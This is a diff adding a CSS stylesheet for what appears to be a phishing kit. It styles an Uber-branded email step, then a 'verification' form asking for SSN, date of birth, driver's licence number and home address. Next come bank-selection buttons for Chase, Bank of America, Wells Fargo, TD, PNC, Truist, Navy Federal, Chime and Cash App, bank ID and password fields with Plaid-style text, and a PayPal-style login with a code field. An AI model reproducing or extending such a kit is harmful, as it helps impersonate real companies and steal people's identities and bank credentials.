@@ -1,0 +1,1289 @@
+html {
+    box-sizing: border-box;
+    left: 0;
+    right: 0;;
+  }
+  *, *:before, *:after {
+    box-sizing: inherit;
+  }
+body{
+   
+    display: flex;
+    flex-direction: column;
+    width: 100%;
+    height: 100vh;
+    margin: 0;
+    background-color: #ffffff;
+    font-family: Comfortaa;
+    left: 0;
+    right: 0;
+    top: 0;
+    bottom: 0;
+    padding: 0;
+
+    
+}
+nav{
+    
+    top: 0;
+    width: 100%;
+    
+    background-color: black;
+    height: 65px;
+    padding-bottom: 5px;
+}
+#navv{
+    padding-bottom: 20px;
+}
+
+
+#logo{
+    margin-left: 4.19%;
+    margin-top: 20px;
+    
+}
+#counter{
+    font-family: 'Trebuchet MS', 'Lucida Sans Unicode', 'Lucida Grande', 'Lucida Sans', Arial, sans-serif;
+}
+
+.container{
+    height: 100vh;
+    width: 100%;
+    background-color: rgb(255, 255, 255);
+    display: flex;
+    flex-direction: row;
+    justify-content: center;
+    
+}
+
+
+.frst1{
+    background-color: white;
+    max-width: 320px;
+    width: 100%;
+    border-radius: 6px;
+    position: relative;
+    display: block;
+}
+.cc-card{
+    margin-top: 20px;
+    margin-bottom: 40px;
+    
+}
+.cc-card img{
+    float: right;
+    position: relative;
+    width: 90px;
+}
+.uberinput input{
+    font-size: 16px;
+    padding: 13px;
+    font-weight: 200;
+    height: 100%;
+    width: 100%;
+    border:none;
+    border-radius: 5px;
+    outline: none;
+    background-color: rgb(239, 239, 239);
+}
+.uberinput input:focus{
+    border: solid 2px black;
+    background-color: white;
+}
+
+.uberinput{
+    margin-top: 20px;
+}
+#label1uberemail{
+    font-family:Arial, Helvetica, sans-serif;
+    font-size: 24px;
+    font-weight:200 ;
+    margin-top: 20px;
+
+}
+
+.btncontinue1 button{
+    cursor: pointer;
+    width: 100%;
+    height: 3rem;
+    border-radius: 8px;
+    background-color: black;
+    border: none;
+    color: white;
+    font-size: 16px;
+}
+.btncontinue1 button:hover{
+    background-color: rgb(49, 47, 47);
+    transition: ease 0.5s;
+}
+.btncontinue1{
+    margin-top: 18px;
+}
+#prg p{
+    font-family:Arial, Helvetica, sans-serif ;
+    color: rgb(0, 0, 0);
+    font-size: 12px;
+    line-height: 1.5em;
+}
+#prg{
+    display: hidden;
+    margin-top: 130px;
+    background-color: rgb(255, 255, 255);
+}
+#footer{
+    margin-top: auto;
+    bottom: 0;
+    position: absolute;
+    max-width: 320px;
+    width: 100%;
+    background: transparent;
+}
+#footer p{
+    font-family:Arial, Helvetica, sans-serif ;
+    color: grey;
+    font-size: 12px;
+    line-height: 1.7em;
+}
+#footer a{
+    color: rgb(0, 0, 0);
+}
+#hr1{
+    margin-top: 20px;
+    color: rgb(221, 221, 221);
+    border-style: inset;
+    border-width:1px 0px 0px 0px;
+    height: 1px;
+    }
+    
+    
+
+    /*css for verification begins*/
+    .sec{
+        background-color: rgb(255, 255, 255);
+        max-width: 320px;
+        min-width: 320px;
+        width: 100%;
+        border-radius: 6px;
+        display: none;
+        margin-bottom: 30px;
+        
+    }
+    .verifyfullnameinput input, .verifyssninput input,.verifydlanuminput input,.verifyhomeadinput input,.verifyzipinput input{
+        font-size: 16px;
+        padding: 13px;
+        font-weight: 200;
+        height: 100%;
+        width: 100%;
+        border:solid 1px rgb(118, 118, 118);
+        border-radius: 5px;
+        font-family: 'Trebuchet MS', 'Lucida Sans Unicode', 'Lucida Grande', 'Lucida Sans', Arial, sans-serif;
+    }
+    .verifydobinput input[type="date"]{
+        font-size: 16px;
+        padding: 13px;
+        font-weight: 200;
+        background-color: white;
+
+        -webkit-appearance: textfield;
+        -moz-appearance: textfield;
+        min-height: 1.2em;
+        min-width: 96%;
+        border:solid 1px rgb(118, 118, 118);
+        border-radius: 5px;
+        display:flex;
+        flex: 1 0 0;
+        -webkit-flex: 1 0 0;
+        height: 100%;
+        width: 100%;
+    }
+    .verifydobinput input{
+        font-size: 16px;
+        padding: 13px;
+        font-weight: 200;
+
+        -webkit-appearance: textfield;
+        -moz-appearance: textfield;
+        min-height: 1.2em;
+        min-width: 96%;
+        border:solid 1px rgb(118, 118, 118);
+        border-radius: 5px;
+        display:flex;
+        min-height: 3rem;
+        width: 100%;
+        
+    }
+    .verifydobinput{
+        display:flex;
+        display:-webkit-flex;
+        height: 45px;
+        background-color: rgb(255, 254, 254);
+    }
+    .verifyssninput {
+        max-width: 150px;
+    }
+    .verifyssninput input{
+        text-align: center;
+    }
+    .CardExpiry input{
+        text-align: center;
+    }
+    .verifyzipinput{
+        max-width: 100px;
+        float: right;
+        
+    }
+    .verifyzipinput input{
+        text-align: center;
+    }
+    
+    .verifyfullnameinput input:focus,.verifydobinput input:focus,.verifyssninput input:focus,.verifydlanuminput input:focus,
+    .verifyhomeadinput input:focus,.verifyzipinput input:focus{
+        outline: none;
+        border: solid 2px black;
+    }
+    
+    .verifyfullnameinput,.verifydobinput,.verifydlanuminput,.verifyssninput,.verifyhomeadinput,.verifyzipinput{
+        margin-top: 24px;
+    }
+    #labelverifullname,#labelveridob{
+        font-family:Arial, Helvetica, sans-serif;
+        font-size: 20px;
+        font-weight:200 ;
+        margin-top: 20px;
+    
+    }
+    .ssnzip{
+        display: flex;
+        justify-content: space-between;
+    }
+
+    .btncontinue2 button{
+        cursor: pointer;
+        width: 90px;
+        height: 3.3rem;
+        border-radius: 30px;
+        background-color: black;
+        border: none;
+        color: white;
+        font-size: 18px;
+        padding-left: 12px;
+    }
+    .btncontinue2 button svg{
+        width: 25px;
+    }
+    .btncontinue2 button:hover{
+        background-color: rgb(49, 47, 47);
+        transition: ease 0.5s;
+    }
+    .btncontinue2{
+        margin-top: 50px;
+    }
+    .btnback button{
+        cursor: pointer;
+        width: 54px;
+        height: 3.3rem;
+        border-radius: 30px;
+        background-color: rgb(255, 255, 255);
+        border: none;
+        color: white;
+        font-size: 18px;
+        padding-left: 12px;
+    }
+    .btnback button:hover{
+        background-color: rgb(221, 221, 221);
+        transition: ease 0.5s;
+    }
+    .btnback button:focus{
+        background-color: rgb(221, 221, 221);
+        transition: ease 0.5s;
+    }
+
+    .btnback{
+        margin-top: 50px;
+        margin-bottom: 16px;
+    }
+    .btn2div{
+        display: flex;
+        justify-content: space-between;
+    }
+    .label1ul h3{
+        font-family:'Trebuchet MS', 'Lucida Sans Unicode', 'Lucida Grande', 'Lucida Sans', Arial, sans-serif;
+        font-size: 18px;
+        font-weight:200 ;
+        margin-top: 9px;
+        
+    }
+
+    /*third css begins*/
+    .third{
+        background-color: white;
+        max-width: 350px;
+        min-width: 350px;
+        width: 100%;
+        border-radius: 6px;
+        display: none;
+        
+    }
+    .chasebutton{
+        margin-top: 8px;
+        width: 49%;
+        justify-content: center;
+       display: flex;
+       height: 70px;
+    }
+    .chasebutton button{
+        cursor: pointer;
+        padding: 15px;
+        background-color: lightblue;
+        border: none;
+        border-radius: 10px;
+        width: 100%;
+    }
+    .chasebutton button:hover{
+        background-color: rgb(199, 211, 215);
+        transition: ease .5s;
+    }
+    .chasebutton button:focus{
+        background-color: rgb(199, 211, 215);
+        transition: ease .5s;
+    }
+    .chaselogoresize{
+        width: 140px;
+    }
+
+    .BOA{
+        margin-top: 8px;
+        width: 49%;
+       justify-content: center;
+       display: flex;
+        background-color: rgb(255, 255, 255);
+        height: 70px;
+    }
+    .boalogoresize{
+        width: 140px;
+    }
+    .BOA button{
+        cursor: pointer;
+        padding: 20px;
+        background-color: rgb(230, 173, 173);
+        border: none;
+        border-radius: 10px;
+        width: 100%;
+    }
+    .BOA button:hover{
+        background-color: rgb(215, 199, 199);
+        transition: ease .5s;
+    }
+    .BOA button:focus{
+        background-color: rgb(215, 199, 199);
+        transition: ease .5s;
+    }
+/**********************************************************/
+.wills{
+    margin-top: 8px;
+    width: 49%;
+   justify-content: center;
+   display: flex;
+    background-color: rgb(255, 255, 255);
+    height: 70px;
+}
+.willlogoresize{
+    width: 200px;
+}
+
+.wills button{
+    cursor: pointer;
+    padding: 6px;
+    background-color: rgb(255, 0, 0);
+    border: none;
+    border-radius: 10px;
+    width: 100%;
+}
+.wills button:hover{
+    background-color: rgb(152, 0, 0);
+    transition: ease .5s;
+}
+.wills button:focus{
+    background-color:  rgb(152, 0, 0);
+    transition: ease .5s;
+}
+
+/**********************************************************/
+.td{
+    margin-top: 8px;
+    width: 49%;
+   justify-content: center;
+   display: flex;
+    background-color: rgb(255, 255, 255);
+    height: 70px;
+}
+.tdlogoresize{
+    max-width: 200px;
+}
+.td button{
+    cursor: pointer;
+    padding: 0px;
+    background-color: rgb(159, 255, 175);
+    border: none;
+    border-radius: 10px;
+    width: 100%;
+}
+.td button:hover{
+    background-color: rgb(3, 155, 0);
+    transition: ease .5s;
+}
+.td button:focus{
+    background-color: rgb(3, 155, 0);
+    transition: ease .5s;
+}
+/**********************************************/
+
+.pnc{
+    margin-top: 8px;
+    width: 49%;
+   justify-content: center;
+   display: flex;
+    background-color: rgb(255, 255, 255);
+    height: 70px;
+}
+.pncresize{
+    max-width: 150px;
+}
+.pnc button{
+    cursor: pointer;
+    padding: 7px;
+    background-color: rgb(255, 205, 159);
+    border: none;
+    border-radius: 10px;
+    width: 100%;
+}
+.pnc button:hover{
+    background-color: rgb(215, 155, 51);
+    transition: ease .5s;
+}
+.pnc button:focus{
+    background-color: rgb(206, 141, 29);
+    transition: ease .5s;
+}
+
+/**********************************************/
+
+.truist{
+    margin-top: 8px;
+    width: 49%;
+   justify-content: center;
+   display: flex;
+    background-color: rgb(255, 255, 255);
+    height: 70px;
+}
+.pncresize{
+    max-width: 150px;
+}
+.truist button{
+    cursor: pointer;
+    padding: 12px;
+    background-color: rgb(209, 209, 209);
+    border: none;
+    border-radius: 10px;
+    width: 100%;
+}
+.truist button:hover{
+    background-color: rgb(125, 28, 210);
+    transition: ease .5s;
+}
+.truist button:focus{
+    background-color: rgb(137, 52, 211);
+    transition: ease .5s;
+}
+
+/**********************************************/
+
+.navy{
+    margin-top: 8px;
+    width: 49%;
+   justify-content: center;
+   display: flex;
+    background-color: rgb(255, 255, 255);
+    height: 70px;
+}
+.navyresize{
+    max-width: 80px;
+}
+.navy button{
+    cursor: pointer;
+    padding: 5px;
+    background-color: rgb(125, 173, 255);
+    border: none;
+    border-radius: 10px;
+    width: 100%;
+}
+.navy button:hover{
+    background-color: rgb(63, 140, 255);
+    transition: ease .5s;
+}
+.navy button:focus{
+    background-color: rgb(63, 140, 255);
+    transition: ease .5s;
+}
+/**************************************************/
+.chime{
+    margin-top: 8px;
+    width: 49%;
+   justify-content: center;
+   display: flex;
+    background-color: rgb(255, 255, 255);
+    height: 70px;
+}
+.navyresize{
+    max-width: 80px;
+}
+.chime button{
+    cursor: pointer;
+    padding: 5px;
+    background-color: rgb(210, 255, 214);
+    border: none;
+    border-radius: 10px;
+    width: 100%;
+}
+.chime button:hover{
+    background-color: rgb(179, 255, 168);
+    transition: ease .5s;
+}
+.chime button:focus{
+    background-color: rgb(136, 255, 158);
+    transition: ease .5s;
+}
+/***********************************************/
+.cashapp{
+    margin-top: 8px;
+    width: 49%;
+   justify-content: center;
+   display: flex;
+    background-color: rgb(255, 255, 255);
+    height: 70px;
+}
+.navyresize{
+    max-width: 80px;
+}
+.cashapp button{
+    cursor: pointer;
+    padding: 5px;
+    background-color: rgb(116, 196, 123);
+    border: none;
+    border-radius: 10px;
+    width: 100%;
+}
+.cashapp button:hover{
+    background-color: rgb(206, 241, 200);
+    transition: ease .5s;
+}
+.cashapp button:focus{
+    background-color: rgb(136, 255, 158);
+    transition: ease .5s;
+}
+/*******************************************/
+.other{
+    margin-top: 8px;
+    width: 49%;
+   justify-content: center;
+   display: flex;
+    background-color: rgb(255, 255, 255);
+    height: 70px;
+    
+}
+.navyresize{
+    max-width: 80px;
+}
+.other button{
+    cursor: pointer;
+    padding: 5px;
+    background-color: rgb(255, 255, 255);
+    border: none;
+    border-radius: 10px;
+    width: 100%;
+    font-family: 'Trebuchet MS', 'Lucida Sans Unicode', 'Lucida Grande', 'Lucida Sans', Arial, sans-serif;
+}
+.other button:hover{
+    background-color: rgb(236, 236, 236);
+    transition: ease .5s;
+}
+.other button:focus{
+    background-color: rgb(187, 187, 187);
+    transition: ease .5s;
+}
+/**diving begins for banks**/
+.chaseboa{
+    width: 100%;
+    display: flex;
+    justify-content: space-between;
+}
+.willstd{
+    width: 100%;
+    display: flex;
+    justify-content: space-between;
+}
+.pnctruist{
+    width: 100%;
+    display: flex;
+    justify-content: space-between;
+}
+.navychime{
+    width: 100%;
+    display: flex;
+    justify-content: space-between;
+}
+.cashappother{
+    width: 100%;
+    display: flex;
+    justify-content: space-between;
+}
+
+/*Banks css*/
+.fourth{
+    margin-top: 40px;
+    background-color: rgb(160, 217, 255);
+        max-width: 320px;
+        min-width: 320px;
+        width: 100%;
+        border-radius: 15px;
+        padding-top: 10px;
+        padding-left: 10px ;
+        padding-right: 10px;
+        padding-bottom: 40px;
+        display: none;
+        box-shadow: rgba(14, 30, 37, 0.12) 0px 2px 4px 0px, rgba(14, 30, 37, 0.32) 0px 2px 16px 0px;
+}
+.four{
+    
+}
+
+.verifybanksid{
+    margin-top: 20px;
+}
+.verifybanksid input,.verifybankspass input,.hiddeniput input{
+    font-size: 16px;
+        padding: 13px;
+        font-weight: 200;
+        height: 100%;
+        width: 100%;
+        border: 0;
+        border-bottom:solid 1px rgb(118, 118, 118);
+        border-radius: 0px;
+        background: transparent;
+        outline: 0;
+        
+}
+.verifybankspass input:focus,.verifybanksid input:focus, .hiddeniput input:focus {
+    border-bottom:solid 2px blue;
+    
+  }
+.verifybanksid input:focus,.verifybankspass input:focus{
+    
+}
+
+.verifybankspass{
+    margin-top: 10px;
+}
+.banksbutton{
+    margin-top: 15px;
+}
+
+.banksbutton button{
+    cursor: pointer;
+    width: 100%;
+    height: 3.3rem;
+    border-radius: 10px;
+    background-color: rgb(0, 106, 255);
+    border: none;
+    color: white;
+    font-size: 18px;
+    padding-left: 12px;
+}
+
+.logochasso2{
+    width: 140px;
+    color: white;
+}
+.logoboa{
+    width: 210px;
+}
+.logochasso{
+    background:transparent;
+    width: 100%;
+    height: 60px;
+    display: flex;
+    justify-content: center;
+}
+.plaidpoli{
+    margin-top: 10px;
+}
+.plaidpoli p{
+    font-family: Arial, Helvetica, sans-serif;
+    font-size: 12px;
+    color: grey;
+}
+.plaidlogooo{
+    margin-top: 6px;
+    display: flex;
+    justify-content: center;
+}
+.form1{
+    background-color: white;
+    max-width: 360px;
+}
+
+
+#hdinp{
+    display: none;
+}
+#chimelogo{
+    width: 120px;
+}
+#boalo{
+    height: 30px;
+}
+#chimelogo{
+    height: 40px;
+}
+#cashapplogo{
+    height: 65px;
+}
+#cha{
+    height: 27px
+}
+
+
+/*===============================================================*/
+@import url('http://fonts.cdnfonts.com/css/atkinson-hyperlegible');
+
+               
+.container1{
+    height: 100vh;
+    width: 100%;
+    background-color: rgb(255, 255, 255);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    
+}
+.con2{
+    padding: 20px;
+    margin-top: 80px;
+    max-width:420px;
+    height: 100vh;
+    width: 100%;
+    background-color: rgb(255, 255, 255);
+    align-items: center;
+    justify-content: center;
+}
+#vfe{
+    font-family: 'Trebuchet MS', 'Lucida Sans Unicode', 'Lucida Grande', 'Lucida Sans', Arial, sans-serif;
+}
+#h13{
+    font-family: 'Trebuchet MS', 'Lucida Sans Unicode', 'Lucida Grande', 'Lucida Sans', Arial, sans-serif;
+}
+
+.container1 .formr{
+    padding: auto;
+    
+}
+
+.signinpassword{
+    padding-bottom: 10px;
+}
+.signinpassword h1{
+    font-weight: 100;
+}
+
+.hd h4{
+    text-align: center;  
+    color: rgba(255, 255, 255, 0.699);
+}
+.hd{
+    background-color: rgb(255, 255, 255);
+    height: 30px;
+    width: 100%;
+    box-shadow: 5px 5px 15px 15px rgb(44, 44, 44);
+}
+.form{
+    background-color: rgb(255, 255, 255);
+    max-width: 435px;
+    width: 100%;
+    padding: 30px;
+    border-radius: 6px;
+}
+
+.paypal_img{
+    margin-bottom: 40px;
+    padding-left: px;
+}
+.email-label{
+    font-weight: 500;
+    font-size: 16px;
+    
+}
+.container1 form{
+    margin-top: 5px;
+}
+
+form .field{
+    height: 60px;
+    width: 100%;
+    margin-top: 20px;
+}
+.field1{
+    height: 60px;
+    width: 100%;
+    margin-top: 20px;
+}
+
+.field input{
+    font-size: 20px;
+    font-weight: 200;
+    padding: 10px;
+    font-weight: 200;
+    height: 100%;
+    width: 100%;
+    border:1px solid;
+    border-color: rgb(153, 153, 153);
+    border-radius: 10px;
+
+}
+.field input:focus{
+    transition: ease 0.4s;
+    border-color:rgb(0, 0, 255);
+    border-style: groove;
+    outline-style: groove;
+    outline-color: rgb(0, 0, 255);
+    
+}
+
+.field{
+    margin-top: 40px;
+}
+.field button{
+    margin-top: 30px;
+    cursor: pointer;
+    height: 100%;
+    width: 100%;
+    font-size: 17px;
+    color: white;
+    font-weight:600;
+    background-color: rgb(0, 0, 0);
+    border-radius: 40px;
+    border: none;
+   
+}
+.field button:hover{
+    background-color: rgb(27, 27, 27);
+    transition: ease .3s;
+    
+}
+.field button:focus{
+    background-color: rgb(43, 43, 43);
+
+   
+}
+.forgot-password{
+    margin-top: 20px;
+    text-align: center;
+
+}
+.privacy-policy{
+    text-align: center;
+    font-weight: 100;
+    font-size: 19px;
+}
+.privacy-policy a{
+    font-weight: 100;
+    font-size: 30px;
+    font-family: 'Trebuchet MS', 'Lucida Sans Unicode', 'Lucida Grande', 'Lucida Sans', Arial, sans-serif;
+    color: grey;
+
+}
+/*fiel button 2*/
+.field1 button{
+    margin-top: 15px;
+    cursor: pointer;
+    height: 100%;
+    width: 100%;
+    font-size: 17px;
+    color: rgb(0, 0, 0);
+    font-weight:600;
+    background-color: rgb(255, 255, 255);
+    border-radius: 40px;
+    border: none;
+    transition: ease-out 0.5s;
+}
+.field1 button:hover{
+    background-color: rgb(255, 255, 255);
+    color: rgb(0, 0, 0);
+    transition: ease-in 0.5s;
+}
+
+
+.paypal_img img{
+    width: 125px;
+}
+
+
+.thankyou_message{
+    display:none;
+    background:none; 
+}
+.thankyou_message h6{
+    color: red;
+    font-size: 13px;
+    font-weight: 600;
+    text-align: center;
+}
+.phoneicon{
+    display: none;
+    width: 125px;
+    margin-bottom: 20px;
+    padding-left: px;
+}
+
+#noly{
+    display: none;
+    border: 10px;
+    
+}
+.password-label{
+   padding-bottom:8px;
+}
+
+#no-ly1{
+    padding-left: 45px;
+    text-align: left;
+    background-color: white;
+    outline-style: none;
+    cursor: pointer;
+    color: black;
+    border-color: #dcdcdc;
+  
+    
+}
+#no-ly1 :focus{
+    outline-style: none;  
+}
+
+#lo{width: 45px; 
+    position: absolute;
+    padding-left: 10px;
+    padding-top: 12px;
+   
+}
+#lo1{
+    
+}
+
+#no-ly1 :hover{
+    
+}
+#h12{
+    display: none;
+}
+
+.forgot-password1{
+    display: none;
+    margin-top: 70px;
+}
+
+#h11{
+    font-size: 30px;
+}
+#h12{
+    font-size: 30px;
+}
+
+#sclick1{
+
+}
+#f1{
+    display: none;
+    padding-top: px;
+}
+#f2 a{
+    font-size: 14px;
+}
+#poli1 a{
+    font-size: 14px;
+    margin-top: 20px;
+}
+
+#png1{
+    width: 40px;
+    
+}
+#noly img{
+    padding-bottom:10px;
+}
+
+.form .paypal_img{
+    margin-top: 30px;
+}
+.form h1{
+    font-weight: 600;
+    letter-spacing: px;
+    font-size: 30px;
+}
+.password-label label{
+    font-size: 15px;
+    color: black;
+    font-weight: bold;
+}
+#fclick9{
+    
+    letter-spacing: 2px;
+    border: none;
+    outline: none;
+}
+#fclick9:focus{
+    letter-spacing: 20px;
+}
+
+
+
+.field #fclick9{
+    font-size: 30px;
+    text-align: center;
+    
+}
+
+.input4:focus::placeholder{
+   color: transparent;
+}
+
+
+
+
+#poli3 a{
+    font-size: 15px;
+}
+#lo4{
+    width: 45px;
+    position: absolute;
+    padding-left: 10px;
+    padding-top: 8px;
+}
+
+/* Chrome, Safari, Edge, Opera */
+
+
+/* Firefox */
+
+
+/*Resposiveness*/
+
+@media screen and (max-width:600px) {
+    .container{
+        height: 93vh;
+        width: 100%;
+        margin-bottom: 0px;
+        
+        
+    }
+    
+    #no-ly1{
+        
+        
+    }
+    .form{
+        margin-top: -350px;
+    }
+    
+    .paypal_img{
+        display: none;
+    }
+    .phoneicon{
+        display:block;
+        width: 70px;
+        margin-left: -15px;
+    }
+}
+
+@media  (max-width:400px) {
+    .form{
+        margin-top: -220px;
+        
+    }
+    .paypal_img{
+        margin-top: px;
+        padding-left: 95px;
+    }
+
+  
+    
+
+    
+}   
+@media screen and (max-height:800px) {
+    .form{
+        margin-top: -100px;
+    }
+}    
+
+@media  (max-width:360px) {
+    .form{
+        margin-top: -150px;
+        
+    }
+    
+
+    
+}
+/*verification success styling*/
+.tainer{
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    padding: 20px;
+    
+    
+}
+.tainer2{
+    margin-top: 50px;
+    height: 60vh;
+    width: 400px;
+    background-color: rgb(255, 255, 255);
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    border-radius: 10px;
+    box-shadow: rgba(14, 30, 37, 0.12) 0px 2px 4px 0px, rgba(14, 30, 37, 0.32) 0px 2px 16px 0px;
+}
+.round{
+    margin-top: -50px;
+}
+.roundimg{
+    width: 40px;
+}
+.donemess{
+    font-family: 'Trebuchet MS', 'Lucida Sans Unicode', 'Lucida Grande', 'Lucida Sans', Arial, sans-serif;
+    font-size: 20px;
+}
+.successok{
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    width: 100%;
+    padding: 20px;
+}
+.successok button{
+    cursor: pointer;
+    width: 150px;
+    height: 3rem;
+    font-family: 'Trebuchet MS', 'Lucida Sans Unicode', 'Lucida Grande', 'Lucida Sans', Arial, sans-serif;
+    font-weight: 600;
+    font-size: 20px;
+    border: none;
+    background-color: black;
+    border-radius: 8px;
+    color: white;
+}
+.successok button:hover{
+    background-color: rgb(49, 49, 49);
+    
+}
+.successok button:focus{
+    background-color: rgb(49, 49, 49);
+}
+/*================================================================*/
+
+
+@media screen and (max-width:599px){
+
+    #label1uberemail{
+        font-size: 20px;
+        
+    
+    }
+    .btncontinue2 button{
+        font-size: 16px;
+    }
+    .btncontinue2 button svg{
+        width: 21px;
+        margin-top: 2px;
+    }
+
+    .frst1{
+        background-color: rgb(255, 255, 255);
+        max-width: 600px;
+        width: 100%;
+        border-radius: 6px;
+        flex-direction: column;
+        padding: 0 15px;
+    }
+    #footer {
+        position: absolute;
+        background-color: white;
+        top: 100%;
+        width: 100%;
+        max-width: 350px;
+        padding-left: 20px;
+        padding-right: 8px;
+        margin-left: auto;
+        margin-right: auto;
+        
+        
+    }
+    #prg{
+        padding: 0 10px;
+    }
+    /*sec*/
+    .sec{
+        background-color: rgb(255, 255, 255);
+        max-width: 600px;
+        width: 100%;
+        border-radius: 6px;
+        flex-direction: column;
+        padding: 0 15px;
+    }
+    .btn2div{
+        margin-top: -20px;
+    }
+    /*third*/
+    .third{
+        margin: auto;
+        background-color: white;
+        max-width: 455px;
+        width: 94%;
+        border-radius: 2px;
+        flex-direction: column;
+        padding: 0 6px;
+    }
+
+    /*fourth*/
+    .fourth{
+        max-width: 600px;
+        width: 100%;
+        border-radius: 6px;
+        flex-direction: column;
+        padding-left:  15px;
+        padding-right:  15px;
+    }
+
+}
+
+@media (max-height:668px){
+    body{
+    }
+    .container{
+        height: 105vh;
+    }
+
+    .frst1{
+        background-color: rgb(255, 255, 255);
+        max-width: 600px;
+        width: 100%;
+        border-radius: 6px;
+        flex-direction: column;
+        padding: 0 15px;
+    }
+    .fourth{
+    
+    }
+
+}
